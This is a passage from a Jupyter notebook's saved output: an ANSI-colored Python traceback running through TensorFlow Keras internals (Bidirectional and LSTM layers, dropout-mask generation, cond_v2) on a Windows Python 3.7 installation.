layer.\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\layers\\wrappers.py\u001b[0m in \u001b[0;36m__call__\u001b[1;34m(self, inputs, initial_state, constants, **kwargs)\u001b[0m\n\u001b[0;32m    541\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    542\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[0minitial_state\u001b[0m \u001b[1;32mis\u001b[0m \u001b[1;32mNone\u001b[0m \u001b[1;32mand\u001b[0m \u001b[0mconstants\u001b[0m \u001b[1;32mis\u001b[0m \u001b[1;32mNone\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 543\u001b[1;33m       \u001b[1;32mreturn\u001b[0m \u001b[0msuper\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mBidirectional\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mself\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0m__call__\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0minputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    544\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    545\u001b[0m     \u001b[1;31m# Applies the same workaround as in `RNN.__call__`\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\engine\\base_layer.py\u001b[0m in \u001b[0;36m__call__\u001b[1;34m(self, inputs, *args, **kwargs)\u001b[0m\n\u001b[0;32m    771\u001b[0m                     not base_layer_utils.is_in_eager_or_tf_function()):\n\u001b[0;32m    772\u001b[0m                   \u001b[1;32mwith\u001b[0m \u001b[0mauto_control_deps\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mAutomaticControlDependencies\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;32mas\u001b[0m \u001b[0macd\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 773\u001b[1;33m                     \u001b[0moutputs\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mcall_fn\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mcast_inputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m*\u001b[0m\u001b[0margs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    774\u001b[0m                     \u001b[1;31m# Wrap Tensors in `outputs` in `tf.identity` to avoid\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    775\u001b[0m                     \u001b[1;31m# circular dependencies.\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\layers\\wrappers.py\u001b[0m in \u001b[0;36mcall\u001b[1;34m(self, inputs, training, mask, initial_state, constants)\u001b[0m\n\u001b[0;32m    655\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    656\u001b[0m       y = self.forward_layer(forward_inputs,\n\u001b[1;32m--> 657\u001b[1;33m                              initial_state=forward_state, **kwargs)\n\u001b[0m\u001b[0;32m    658\u001b[0m       y_rev = self.backward_layer(backward_inputs,\n\u001b[0;32m    659\u001b[0m                                   initial_state=backward_state, **kwargs)\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\layers\\recurrent.py\u001b[0m in \u001b[0;36m__call__\u001b[1;34m(self, inputs, initial_state, constants, **kwargs)\u001b[0m\n\u001b[0;32m    642\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    643\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[0minitial_state\u001b[0m \u001b[1;32mis\u001b[0m \u001b[1;32mNone\u001b[0m \u001b[1;32mand\u001b[0m \u001b[0mconstants\u001b[0m \u001b[1;32mis\u001b[0m \u001b[1;32mNone\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 644\u001b[1;33m       \u001b[1;32mreturn\u001b[0m \u001b[0msuper\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mRNN\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mself\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0m__call__\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0minputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    645\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    646\u001b[0m     \u001b[1;31m# If any of `initial_state` or `constants` are specified and are Keras\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\engine\\base_layer.py\u001b[0m in \u001b[0;36m__call__\u001b[1;34m(self, inputs, *args, **kwargs)\u001b[0m\n\u001b[0;32m    771\u001b[0m                     not base_layer_utils.is_in_eager_or_tf_function()):\n\u001b[0;32m    772\u001b[0m                   \u001b[1;32mwith\u001b[0m \u001b[0mauto_control_deps\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mAutomaticControlDependencies\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;32mas\u001b[0m \u001b[0macd\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 773\u001b[1;33m                     \u001b[0moutputs\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mcall_fn\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mcast_inputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m*\u001b[0m\u001b[0margs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    774\u001b[0m                     \u001b[1;31m# Wrap Tensors in `outputs` in `tf.identity` to avoid\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    775\u001b[0m                     \u001b[1;31m# circular dependencies.\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\layers\\recurrent_v2.py\u001b[0m in \u001b[0;36mcall\u001b[1;34m(self, inputs, mask, training, initial_state)\u001b[0m\n\u001b[0;32m   1100\u001b[0m           \u001b[0minput_length\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mrow_lengths\u001b[0m \u001b[1;32mif\u001b[0m \u001b[0mrow_lengths\u001b[0m \u001b[1;32mis\u001b[0m \u001b[1;32mnot\u001b[0m \u001b[1;32mNone\u001b[0m \u001b[1;32melse\u001b[0m \u001b[0mtimesteps\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   1101\u001b[0m           \u001b[0mtime_major\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mtime_major\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m-> 1102\u001b[1;33m           zero_output_for_mask=self.zero_output_for_mask)\n\u001b[0m\u001b[0;32m   1103\u001b[0m       \u001b[0mruntime\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0m_runtime\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0m_RUNTIME_UNKNOWN\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   1104\u001b[0m     \u001b[1;32melse\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\backend.py\u001b[0m in \u001b[0;36mrnn\u001b[1;34m(step_function, inputs, initial_states, go_backwards, mask, constants, unroll, input_length, time_major, zero_output_for_mask)\u001b[0m\n\u001b[0;32m   4025\u001b[0m     \u001b[1;31m# the value is discarded.\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   4026\u001b[0m     output_time_zero, _ = step_function(\n\u001b[1;32m-> 4027\u001b[1;33m         input_time_zero, tuple(initial_states) + tuple(constants))\n\u001b[0m\u001b[0;32m   4028\u001b[0m     output_ta = tuple(\n\u001b[0;32m   4029\u001b[0m         tensor_array_ops.TensorArray(\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\layers\\recurrent_v2.py\u001b[0m in \u001b[0;36mstep\u001b[1;34m(inputs, states)\u001b[0m\n\u001b[0;32m   1088\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   1089\u001b[0m       \u001b[1;32mdef\u001b[0m \u001b[0mstep\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0minputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mstates\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m-> 1090\u001b[1;33m         \u001b[1;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mcell\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mcall\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0minputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mstates\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m   1091\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   1092\u001b[0m       last_output, outputs, states = K.rnn(\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\layers\\recurrent.py\u001b[0m in \u001b[0;36mcall\u001b[1;34m(self, inputs, states, training)\u001b[0m\n\u001b[0;32m   2357\u001b[0m     \u001b[0mc_tm1\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mstates\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;36m1\u001b[0m\u001b[1;33m]\u001b[0m  \u001b[1;31m# previous carry state\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   2358\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m-> 2359\u001b[1;33m     \u001b[0mdp_mask\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mget_dropout_mask_for_cell\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0minputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mtraining\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mcount\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;36m4\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m   2360\u001b[0m     rec_dp_mask = self.get_recurrent_dropout_mask_for_cell(\n\u001b[0;32m   2361\u001b[0m         h_tm1, training, count=4)\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\layers\\recurrent.py\u001b[0m in \u001b[0;36mget_dropout_mask_for_cell\u001b[1;34m(self, inputs, training, count)\u001b[0m\n\u001b[0;32m   1133\u001b[0m           \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mdropout\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   1134\u001b[0m           \u001b[0mtraining\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mtraining\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m-> 1135\u001b[1;33m           count=count)\n\u001b[0m\u001b[0;32m   1136\u001b[0m       \u001b[1;32mif\u001b[0m \u001b[0mcontext\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mexecuting_eagerly\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   1137\u001b[0m         \u001b[0mself\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0m_eager_dropout_mask\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mdp_mask\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\layers\\recurrent.py\u001b[0m in \u001b[0;36m_generate_dropout_mask\u001b[1;34m(ones, rate, training, count)\u001b[0m\n\u001b[0;32m   2817\u001b[0m     return [\n\u001b[0;32m   2818\u001b[0m         \u001b[0mK\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0min_train_phase\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mdropped_inputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mones\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mtraining\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mtraining\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m-> 2819\u001b[1;33m         \u001b[1;32mfor\u001b[0m \u001b[0m_\u001b[0m \u001b[1;32min\u001b[0m \u001b[0mrange\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mcount\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m   2820\u001b[0m     ]\n\u001b[0;32m   2821\u001b[0m   \u001b[1;32mreturn\u001b[0m \u001b[0mK\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0min_train_phase\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mdropped_inputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mones\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mtraining\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mtraining\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\layers\\recurrent.py\u001b[0m in \u001b[0;36m<listcomp>\u001b[1;34m(.0)\u001b[0m\n\u001b[0;32m   2817\u001b[0m     return [\n\u001b[0;32m   2818\u001b[0m         \u001b[0mK\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0min_train_phase\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mdropped_inputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mones\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mtraining\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mtraining\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m-> 2819\u001b[1;33m         \u001b[1;32mfor\u001b[0m \u001b[0m_\u001b[0m \u001b[1;32min\u001b[0m \u001b[0mrange\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mcount\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m   2820\u001b[0m     ]\n\u001b[0;32m   2821\u001b[0m   \u001b[1;32mreturn\u001b[0m \u001b[0mK\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0min_train_phase\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mdropped_inputs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mones\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mtraining\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mtraining\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\backend.py\u001b[0m in \u001b[0;36min_train_phase\u001b[1;34m(x, alt, training)\u001b[0m\n\u001b[0;32m   4301\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   4302\u001b[0m   \u001b[1;31m# else: assume learning phase is a placeholder tensor.\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m-> 4303\u001b[1;33m   \u001b[0mx\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mswitch\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mtraining\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mx\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0malt\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m   4304\u001b[0m   \u001b[1;32mreturn\u001b[0m \u001b[0mx\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   4305\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\backend.py\u001b[0m in \u001b[0;36mswitch\u001b[1;34m(condition, then_expression, else_expression)\u001b[0m\n\u001b[0;32m   4234\u001b[0m     \u001b[1;32melse\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   4235\u001b[0m       \u001b[0melse_expression_fn\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0melse_expression\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m-> 4236\u001b[1;33m     \u001b[0mx\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mcontrol_flow_ops\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mcond\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mcondition\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mthen_expression_fn\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0melse_expression_fn\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m   4237\u001b[0m   \u001b[1;32melse\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   4238\u001b[0m     \u001b[1;31m# tf.where needs its condition tensor\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\util\\deprecation.py\u001b[0m in \u001b[0;36mnew_func\u001b[1;34m(*args, **kwargs)\u001b[0m\n\u001b[0;32m    505\u001b[0m                 \u001b[1;34m'in a future version'\u001b[0m \u001b[1;32mif\u001b[0m \u001b[0mdate\u001b[0m \u001b[1;32mis\u001b[0m \u001b[1;32mNone\u001b[0m \u001b[1;32melse\u001b[0m \u001b[1;33m(\u001b[0m\u001b[1;34m'after %s'\u001b[0m \u001b[1;33m%\u001b[0m \u001b[0mdate\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    506\u001b[0m                 instructions)\n\u001b[1;32m--> 507\u001b[1;33m       \u001b[1;32mreturn\u001b[0m \u001b[0mfunc\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m*\u001b[0m\u001b[0margs\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m**\u001b[0m\u001b[0mkwargs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    508\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    509\u001b[0m     doc = _add_deprecated_arg_notice_to_docstring(\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\ops\\control_flow_ops.py\u001b[0m in \u001b[0;36mcond\u001b[1;34m(pred, true_fn, false_fn, strict, name, fn1, fn2)\u001b[0m\n\u001b[0;32m   1172\u001b[0m   if (util.EnableControlFlowV2(ops.get_default_graph()) and\n\u001b[0;32m   1173\u001b[0m       not context.executing_eagerly()):\n\u001b[1;32m-> 1174\u001b[1;33m     \u001b[1;32mreturn\u001b[0m \u001b[0mcond_v2\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mcond_v2\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mpred\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mtrue_fn\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mfalse_fn\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mname\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m   1175\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   1176\u001b[0m   \u001b[1;31m# We needed to make true_fn/false_fn keyword arguments for\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\ops\\cond_v2.py\u001b[0m in \u001b[0;36mcond_v2\u001b[1;34m(pred, true_fn, false_fn, name)\u001b[0m\n\u001b[0;32m     81\u001b[0m             true_name, collections=ops.get_default_graph()._collections),  # pylint: disable=protected-access\n\u001b[0;32m     82\u001b[0m         \u001b[0madd_control_dependencies\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0madd_control_dependencies\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 83\u001b[1;33m         op_return_value=pred)\n\u001b[0m\u001b[0;32m     84\u001b[0m     false_graph = func_graph_module.func_graph_from_py_func(\n\u001b[0;32m     85\u001b[0m         \u001b[0mfalse_name\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\framework\\func_graph.py\u001b[0m in \u001b[0;36mfunc_graph_from_py_func\u001b[1;34m(name, python_func, args, kwargs, signature, func_graph, autograph, autograph_options, add_control_dependencies, arg_names, op_return_value, collections, capture_by_value, override_flat_arg_shapes)\u001b[0m\n\u001b[0;32m    976\u001b[0m                                           converted_func)\n\u001b[0;32m    977\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 978\u001b[1;33m       \u001b[0mfunc_outputs\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mpython_func\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m*\u001b[0m\u001b[0mfunc_args\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;33m**\u001b[0m\u001b[0mfunc_kwargs\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    979\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    980\u001b[0m       \u001b[1;31m# invariant: `func_outputs` contains only Tensors, CompositeTensors,\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32mC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Python37_64\\lib\\site-packages\\tensorflow_core\\python\\keras\\layers\\recurrent.py\u001b[0m in \u001b[0;36mdropped_inputs\u001b[1;34m()\u001b[0m\n\u001b[0;32m   2812\u001b[0m \u001b[1;32mdef\u001b[0m \u001b[0m_generate_dropout_mask\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mones\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mrate\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mtraining\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;32mNone\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mcount\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;36m1\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   2813\u001b[0m   \u001b[1;32mdef\u001b[0m \u001b[0mdropped_inputs\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m-> 2814\u001b[1;33m     \u001b[1;32mreturn\u001b[0m \u001b[0mK\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mdropout\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mones\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mrate\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m   2815\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m   2816\u001b[0m   \u001b[1;32mif\u001b[0m \u001b[0mcount\u001b[0m \u001b[1;33m>\u001b[0m \u001b[1;36m1\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
